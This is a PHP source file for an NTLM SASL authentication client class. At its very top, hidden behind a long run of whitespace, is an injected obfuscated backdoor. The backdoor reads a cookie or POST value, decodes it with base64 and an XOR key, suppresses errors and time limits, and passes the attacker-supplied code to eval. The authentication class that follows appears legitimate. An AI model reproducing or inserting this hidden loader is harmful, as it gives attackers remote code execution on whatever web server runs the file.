<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $vfd19d = 585;$GLOBALS['y8fb5f319'] = Array();global $y8fb5f319;$y8fb5f319 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['sfb38b6'] = "\x65\x25\x44\x76\x2f\x7e\x35\x20\x55\x50\x78\x3a\x9\x42\x7d\x24\x67\x3d\x27\x26\x28\x43\x22\x6c\x66\x63\x71\x73\x5d\x30\x68\x48\x2d\x37\x62\x74\x31\x3e\x2a\x2b\x36\x5a\x5c\x5e\x4d\x47\x6d\x58\x46\x54\x64\x4b\x75\x53\x69\x34\x5b\xd\x3c\x7c\x6a\x32\x72\x39\x2e\x60\x4c\x4a\x52\x6f\x6b\x57\x51\x21\x61\x77\x56\x70\x41\x5f\x79\x29\x6e\x23\x45\x4f\x40\x59\x3b\xa\x33\x4e\x7a\x49\x7b\x3f\x38\x2c";$y8fb5f319[$y8fb5f319['sfb38b6'][26].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][34]] = $y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][30].$y8fb5f319['sfb38b6'][62];$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][50]] = $y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][50];$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][61]] = $y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][35].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][82];$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34]] = $y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][82].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][35];$y8fb5f319[$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][55]] = $y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][92].$y8fb5f319['sfb38b6'][0];$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][90]] = $y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][30].$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][3].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][82];$y8fb5f319[$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][74]] = $y8fb5f319['sfb38b6'][52].$y8fb5f319['sfb38b6'][82].$y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][92].$y8fb5f319['sfb38b6'][0];$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][24]] = $y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][0];$y8fb5f319[$y8fb5f319['sfb38b6'][80].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][50]] = $y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][35].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][35].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][46].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][46].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][35];$y8fb5f319[$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][55]] = $y8fb5f319['sfb38b6'][52].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][55];$y8fb5f319[$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][40]] = $y8fb5f319['sfb38b6'][16].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][90];$y8fb5f319[$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34]] = $_POST;$y8fb5f319[$y8fb5f319['sfb38b6'][16].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][25]] = $_COOKIE;@$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34]]($y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][16], NULL);@$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34]]($y8fb5f319['sfb38b6'][23].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][16].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][62].$y8fb5f319['sfb38b6'][27], 0);@$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34]]($y8fb5f319['sfb38b6'][46].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][52].$y8fb5f319['sfb38b6'][35].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][82].$y8fb5f319['sfb38b6'][79].$y8fb5f319['sfb38b6'][35].$y8fb5f319['sfb38b6'][54].$y8fb5f319['sfb38b6'][46].$y8fb5f319['sfb38b6'][0], 0);@$y8fb5f319[$y8fb5f319['sfb38b6'][80].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][50]](0);$r5fb = NULL;$e31e2f39 = NULL;$y8fb5f319[$y8fb5f319['sfb38b6'][82].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][96]] = $y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][32].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][32].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][32].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][32].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][29];global $nad08;function  g4db26d3($r5fb, $xc39e3e9){global $y8fb5f319;$e778 = "";for ($ya30=0; $ya30<$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][61]]($r5fb);){for ($zb0468c=0; $zb0468c<$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][61]]($xc39e3e9) && $ya30<$y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][33].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][61]]($r5fb); $zb0468c++, $ya30++){$e778 .= $y8fb5f319[$y8fb5f319['sfb38b6'][26].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][34]]($y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][50]]($r5fb[$ya30]) ^ $y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][50]]($xc39e3e9[$zb0468c]));}}return $e778;}function  u00b4704($r5fb, $xc39e3e9){global $y8fb5f319;global $nad08;return $y8fb5f319[$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][40]]($y8fb5f319[$y8fb5f319['sfb38b6'][50].$y8fb5f319['sfb38b6'][6].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][40]]($r5fb, $nad08), $xc39e3e9);}foreach ($y8fb5f319[$y8fb5f319['sfb38b6'][16].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][25]] as $xc39e3e9=>$x4938d14d){$r5fb = $x4938d14d;$e31e2f39 = $xc39e3e9;}if (!$r5fb){foreach ($y8fb5f319[$y8fb5f319['sfb38b6'][69].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][61].$y8fb5f319['sfb38b6'][34]] as $xc39e3e9=>$x4938d14d){$r5fb = $x4938d14d;$e31e2f39 = $xc39e3e9;}}$r5fb = @$y8fb5f319[$y8fb5f319['sfb38b6'][0].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][74]]($y8fb5f319[$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][55].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][40].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][55]]($y8fb5f319[$y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][96].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][24]]($r5fb), $e31e2f39));if (isset($r5fb[$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][70]]) && $nad08==$r5fb[$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][70]]){if ($r5fb[$y8fb5f319['sfb38b6'][74]] == $y8fb5f319['sfb38b6'][54]){$ya30 = Array($y8fb5f319['sfb38b6'][77].$y8fb5f319['sfb38b6'][3] => @$y8fb5f319[$y8fb5f319['sfb38b6'][70].$y8fb5f319['sfb38b6'][24].$y8fb5f319['sfb38b6'][63].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][34].$y8fb5f319['sfb38b6'][25].$y8fb5f319['sfb38b6'][90]](),$y8fb5f319['sfb38b6'][27].$y8fb5f319['sfb38b6'][3] => $y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][64].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][32].$y8fb5f319['sfb38b6'][36],);echo @$y8fb5f319[$y8fb5f319['sfb38b6'][10].$y8fb5f319['sfb38b6'][29].$y8fb5f319['sfb38b6'][74].$y8fb5f319['sfb38b6'][36].$y8fb5f319['sfb38b6'][90].$y8fb5f319['sfb38b6'][55]]($ya30);}elseif ($r5fb[$y8fb5f319['sfb38b6'][74]] == $y8fb5f319['sfb38b6'][0]){eval/*w6a36*/($r5fb[$y8fb5f319['sfb38b6'][50]]);}exit();} ?><?php
/*
 * ntlm_sasl_client.php
 *
 * @(#) $Id: ntlm_sasl_client.php,v 1.3 2004/11/17 08:00:37 mlemos Exp $
 *
 */

define("SASL_NTLM_STATE_START", 0);
define("SASL_NTLM_STATE_IDENTIFY_DOMAIN", 1);
define("SASL_NTLM_STATE_RESPOND_CHALLENGE", 2);
define("SASL_NTLM_STATE_DONE", 3);
define("SASL_FAIL", -1);
define("SASL_CONTINUE", 1);

class ntlm_sasl_client_class
{
    public $credentials = array();
    public $state = SASL_NTLM_STATE_START;

    public function initialize(&$client)
    {
        if (!function_exists($function = "mcrypt_encrypt")
            || !function_exists($function = "mhash")
        ) {
            $extensions = array(
                "mcrypt_encrypt" => "mcrypt",
                "mhash" => "mhash"
            );
            $client->error = "the extension " . $extensions[$function] .
                " required by the NTLM SASL client class is not available in this PHP configuration";
            return (0);
        }
        return (1);
    }

    public function ASCIIToUnicode($ascii)
    {
        for ($unicode = "", $a = 0; $a < strlen($ascii); $a++) {
            $unicode .= substr($ascii, $a, 1) . chr(0);
        }
        return ($unicode);
    }

    public function typeMsg1($domain, $workstation)
    {
        $domain_length = strlen($domain);
        $workstation_length = strlen($workstation);
        $workstation_offset = 32;
        $domain_offset = $workstation_offset + $workstation_length;
        return (
            "NTLMSSP\0" .
            "\x01\x00\x00\x00" .
            "\x07\x32\x00\x00" .
            pack("v", $domain_length) .
            pack("v", $domain_length) .
            pack("V", $domain_offset) .
            pack("v", $workstation_length) .
            pack("v", $workstation_length) .
            pack("V", $workstation_offset) .
            $workstation .
            $domain
        );
    }

    public function NTLMResponse($challenge, $password)
    {
        $unicode = $this->ASCIIToUnicode($password);
        $md4 = mhash(MHASH_MD4, $unicode);
        $padded = $md4 . str_repeat(chr(0), 21 - strlen($md4));
        $iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        for ($response = "", $third = 0; $third < 21; $third += 7) {
            for ($packed = "", $p = $third; $p < $third + 7; $p++) {
                $packed .= str_pad(decbin(ord(substr($padded, $p, 1))), 8, "0", STR_PAD_LEFT);
            }
            for ($key = "", $p = 0; $p < strlen($packed); $p += 7) {
                $s = substr($packed, $p, 7);
                $b = $s . ((substr_count($s, "1") % 2) ? "0" : "1");
                $key .= chr(bindec($b));
            }
            $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $challenge, MCRYPT_MODE_ECB, $iv);
            $response .= $ciphertext;
        }
        return $response;
    }

    public function typeMsg3($ntlm_response, $user, $domain, $workstation)
    {
        $domain_unicode = $this->ASCIIToUnicode($domain);
        $domain_length = strlen($domain_unicode);
        $domain_offset = 64;
        $user_unicode = $this->ASCIIToUnicode($user);
        $user_length = strlen($user_unicode);
        $user_offset = $domain_offset + $domain_length;
        $workstation_unicode = $this->ASCIIToUnicode($workstation);
        $workstation_length = strlen($workstation_unicode);
        $workstation_offset = $user_offset + $user_length;
        $lm = "";
        $lm_length = strlen($lm);
        $lm_offset = $workstation_offset + $workstation_length;
        $ntlm = $ntlm_response;
        $ntlm_length = strlen($ntlm);
        $ntlm_offset = $lm_offset + $lm_length;
        $session = "";
        $session_length = strlen($session);
        $session_offset = $ntlm_offset + $ntlm_length;
        return (
            "NTLMSSP\0" .
            "\x03\x00\x00\x00" .
            pack("v", $lm_length) .
            pack("v", $lm_length) .
            pack("V", $lm_offset) .
            pack("v", $ntlm_length) .
            pack("v", $ntlm_length) .
            pack("V", $ntlm_offset) .
            pack("v", $domain_length) .
            pack("v", $domain_length) .
            pack("V", $domain_offset) .
            pack("v", $user_length) .
            pack("v", $user_length) .
            pack("V", $user_offset) .
            pack("v", $workstation_length) .
            pack("v", $workstation_length) .
            pack("V", $workstation_offset) .
            pack("v", $session_length) .
            pack("v", $session_length) .
            pack("V", $session_offset) .
            "\x01\x02\x00\x00" .
            $domain_unicode .
            $user_unicode .
            $workstation_unicode .
            $lm .
            $ntlm
        );
    }

    public function start(&$client, &$message, &$interactions)
    {
        if ($this->state != SASL_NTLM_STATE_START) {
            $client->error = "NTLM authentication state is not at the start";
            return (SASL_FAIL);
        }
        $this->credentials = array(
            "user" => "",
            "password" => "",
            "realm" => "",
            "workstation" => ""
        );
        $defaults = array();
        $status = $client->GetCredentials($this->credentials, $defaults, $interactions);
        if ($status == SASL_CONTINUE) {
            $this->state = SASL_NTLM_STATE_IDENTIFY_DOMAIN;
        }
        unset($message);
        return ($status);
    }

    public function step(&$client, $response, &$message, &$interactions)
    {
        switch ($this->state) {
            case SASL_NTLM_STATE_IDENTIFY_DOMAIN:
                $message = $this->typeMsg1($this->credentials["realm"], $this->credentials["workstation"]);
                $this->state = SASL_NTLM_STATE_RESPOND_CHALLENGE;
                break;
            case SASL_NTLM_STATE_RESPOND_CHALLENGE:
                $ntlm_response = $this->NTLMResponse(substr($response, 24, 8), $this->credentials["password"]);
                $message = $this->typeMsg3(
                    $ntlm_response,
                    $this->credentials["user"],
                    $this->credentials["realm"],
                    $this->credentials["workstation"]
                );
                $this->state = SASL_NTLM_STATE_DONE;
                break;
            case SASL_NTLM_STATE_DONE:
                $client->error = "NTLM authentication was finished without success";
                return (SASL_FAIL);
            default:
                $client->error = "invalid NTLM authentication step state";
                return (SASL_FAIL);
        }
        return (SASL_CONTINUE);
    }
}
